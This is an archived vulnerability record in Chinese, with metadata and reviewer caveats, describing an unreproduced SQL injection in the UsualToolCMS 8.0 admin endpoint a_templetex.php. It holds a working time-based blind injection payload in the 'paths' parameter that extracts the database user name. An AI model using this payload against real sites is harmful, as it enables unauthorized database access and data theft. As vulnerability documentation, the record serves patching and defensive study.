---
source: "历史归档批(无原始出处标注)"
product: "UsualToolCMS8.0 a_templetex"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "UsualToolCMS-8.0 a_templetex.php sql注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：cmsadmin模板接口登录权限，MySQL时间注入"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-3deae692cc8c0c7ca710e44d"
entity_id: "ve-3deae692cc8c0c7ca710e44d"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：cmsadmin模板接口登录权限，MySQL时间注入

- **适用与权限边界（1）**：仅相对URL无完整目录/认证/响应/出处；与433同payload，后者补分析/登录脚本。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **结论使用边界（2）**：标题未标后台，不能误认为前台。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# UsualToolCMS-8.0 a_templetex.php sql注入漏洞

payload:

```
a_templetex.php?t=open&id=1&paths=templete/index' where id=1 and if(ascii(substring(user(),1,1))>0,sleep(5),1)--+
```

![image.png](./.resource/UsualToolCMS-8.0a_templetex.phpsql注入漏洞/media/1600850751098-fc38e94b-e10c-4844-bf78-9162a9fccd47.png)

